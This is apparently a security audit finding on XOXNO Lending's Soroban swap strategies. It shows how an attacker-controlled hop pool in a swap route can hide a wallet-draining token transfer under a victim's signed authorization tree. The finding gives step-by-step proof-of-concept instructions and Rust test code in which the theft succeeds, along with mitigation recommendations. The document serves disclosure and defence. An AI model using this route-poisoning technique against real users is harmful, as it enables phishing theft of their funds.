### Title
Malicious swap route embeds arbitrary token transfers under the caller's own authorization tree - ([File: contracts/controller/src/strategies/swap.rs])

### Summary
The bug class in CVE-2025-8580 is UI spoofing: deceiving a user about what an interface is actually doing so they approve an action they did not intend. The on-chain analog in XOXNO Lending is the swap-route authorization shape: every router strategy (`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`, `swap_debt`/`swap_collateral` variants and the direct router path) places caller-chosen route code on the call stack *below* the caller's `require_auth`. A route can name an attacker-controlled "pool" that calls `token.transfer(victim, attacker, X)` on any token in the victim's wallet. Simulation records that transfer as a child of the victim's authorization entry, and the normal "simulate → sign the returned tree" flow silently authorizes it. The result is theft of arbitrary wallet funds disguised inside an ordinary swap authorization.

### Finding Description
`swap_tokens` in `contracts/controller/src/strategies/swap.rs` narrows only the *controller's* grant: it calls `authorize_transfer_as_current(env, token_in, controller, router, amount_in)` with no sub-invocations, snapshots balances, and runs the router under the flash guard [1](#0-0) . That scoping protects the controller's tokens, but the root `caller.require_auth()` on the controller entrypoint (`swap_collateral(caller, account_id, asset_in, amount_in, asset_out, swap)`) creates an authorization tree for the *caller*, and nothing in the controller or the router restricts which contracts the caller-supplied route bytes may name.

The router executes the payload's hops by invoking the pool addresses embedded in `ops`/`assets` (`dispatch_hop` in `contracts/swap-aggregator/src/venues/mod.rs`) [2](#0-1) . A hop pool is arbitrary caller-referenced code; if it calls `token::Client::transfer(&victim, &attacker, &amount)`, that call's `from.require_auth()` resolves against the *caller's* auth entry — Soroban attaches it as a sub-invocation of the caller's root, which is exactly what the harness test proves:

- `simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry` shows `simulateTransaction` (recording mode) returns a poisoned tree where `transfer(alice → attacker, WALLET_BALANCE)` is a child of Alice's `swap_collateral` entry, draining her entire balance of a token the protocol never listed [3](#0-2) .
- `enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer` shows that signing that recorded tree executes the theft, while the honest tree is refused [4](#0-3) .

The threat model acknowledges the shape: the router "keeps no allowlist of them, so a route can put third-party code on the call stack below the caller's authorization... The loss is then the caller's wallet, not the routed amount" — and assigns the only mitigation to off-chain clients decoding the tree before signing [5](#0-4) . On-chain, the route bytes are opaque `StrategySwap` and no contract-side check limits the children a route can record under the caller's entry.

### Impact Explanation
Theft of user funds. A single unprivileged attacker can steal *any* token balance in a victim's wallet — including tokens unrelated to the protocol — bounded only by the victim's balances, not by the routed amount, the route's `min_out`, or the final account risk gate. The attack fits a standard quote/phishing flow: serve the victim a crafted `routeXdr` whose hop pool steals; the victim's own wallet UI displays a legitimate-looking `swap_collateral` authorization (the spoofing element), and the hidden child transfer executes under their signature.

### Likelihood Explanation
Medium. Exploitation requires the victim to sign a poisoned auth tree produced by simulation of an attacker-supplied route — i.e., a phishing/malicious-frontend prerequisite, matching the UI-spoofing bug class rather than a pure on-chain bug. However, the default tooling path (simulate, sign the returned tree) actively produces the malicious tree for the victim, no privileged access or listing status is needed, and the attacker controls the venue code entirely. The protocol performs no on-chain mitigation; the only defense is client-side tree inspection, which the docs themselves note is a requirement clients must implement.

### Recommendation
- Constrain route reachability on-chain: maintain a governance/owner-managed allowlist of venue pool contracts (or venue contract WASM hashes) that `execute_strategy`/`dispatch_hop` may invoke, so a route cannot place arbitrary attacker code under the caller's auth.
- Alternatively, execute each hop's venue call in a frame that cannot escalate the caller's auth — e.g., require that hop pools only pull funds the router self-authorizes via `authorize_as_current_contract`, and document/enforce that any additional `require_auth` on the caller inside a hop aborts the call.
- At minimum, add an explicit invariant/test gate that an honest route produces *zero* additional children under the caller's auth entry for controller strategies and exactly one (the input transfer) for direct `execute_strategy`, and surface any deviation as a hard failure rather than relying on client decoding.

### Proof of Concept
The repo already contains an executable PoC in `tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs`:

1. Attacker deploys `RogueHopPool` configured with `(victim = Alice, wallet_token, to = attacker, amount = Alice's full balance)` [6](#0-5) .
2. Attacker serves Alice a `swap_collateral` route whose `hop_pool` is that contract, with a fair `min_out` so the swap itself succeeds [7](#0-6) .
3. Alice simulates; the recorded auth tree contains `wallet_token.transfer(alice → attacker, WALLET_BALANCE)` as a child of her `swap_collateral` entry [8](#0-7) .
4. Alice signs the simulated tree; execution transfers her entire wallet balance to the attacker while she still receives a fair swap output [9](#0-8) .

The same exposure exists for the direct `execute_strategy` sender and for every strategy verb that funnels through `swap_tokens` (`swap_collateral`, `swap_debt`, `repay_debt_with_collateral`, `multiply`, `flash_position` swap legs).

```rust
pub(crate) fn dispatch_hop(
    env: &Env,
    router: &Address,
    hop: &SwapHop,
    amount_in: i128,
    tokens_cache: &mut Map<Address, Vec<Address>>,
) -> i128 {
    let ctx = HopContext::new(env, router, hop, amount_in);
    let before_in = ctx.input_balance();
    let before_out = ctx.output_balance();

    match hop.venue {
        SwapVenue::Soroswap => soroswap::swap(&ctx),
        SwapVenue::Aquarius => aquarius::swap(&ctx, tokens_cache),
        SwapVenue::Phoenix => phoenix::swap(&ctx),
        SwapVenue::Sushi => sushi::swap(&ctx),
        SwapVenue::CometDex => comet::swap(&ctx),
    };

    let received = ctx
        .output_balance()
        .checked_sub(before_out)
        .unwrap_or_else(|| panic_with_error!(env, Error::ZeroOutput));
    if received <= 0 {
        panic_with_error!(env, Error::ZeroOutput);
    }

    let after_in = ctx.input_balance();
    let spent = before_in
        .checked_sub(after_in)
        .unwrap_or_else(|| panic_with_error!(env, Error::InvalidAmount));
    if spent != amount_in {
        panic_with_error!(env, Error::InvalidAmount);
    }

    received
}
```

```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
}
```

```rust
#[test]
fn enforced_auth_moves_the_wallet_token_only_when_the_signed_tree_lists_the_rogue_transfer() {
    let s = Scene::new();

    // Control: a pool that touches nothing passes with the honest root-only tree.
    let benign = s.route_through_pool_stealing(0);
    s.try_swap_with_signed_tree(&benign, &[])
        .expect("the honest tree authorizes an honest route");
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);

    // Rogue pool, honest tree: the host refuses the transfer and the whole call rolls back.
    s.t.env.mock_all_auths_allowing_non_root_auth();
    let rogue = s.route_through_pool_stealing(WALLET_BALANCE);
    let usdc_before = s.t.supply_balance_raw(ALICE, "USDC");
    let refused = s
        .try_swap_with_signed_tree(&rogue, &[])
        .expect_err("a transfer outside the signed tree is unauthorized");
    std::println!("rogue transfer under the honest tree = {refused:?}");
    assert!(
        refused.is_type(ScErrorType::Auth) || refused.is_type(ScErrorType::Context),
        "expected a host auth failure, got {refused:?}"
    );
    assert!(s
        .diagnostics()
        .contains("Unauthorized function call for address"));
    assert_eq!(s.wallet(&s.alice), WALLET_BALANCE);
    assert_eq!(s.wallet(&s.attacker), 0);
    assert_eq!(s.t.supply_balance_raw(ALICE, "USDC"), usdc_before);

    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
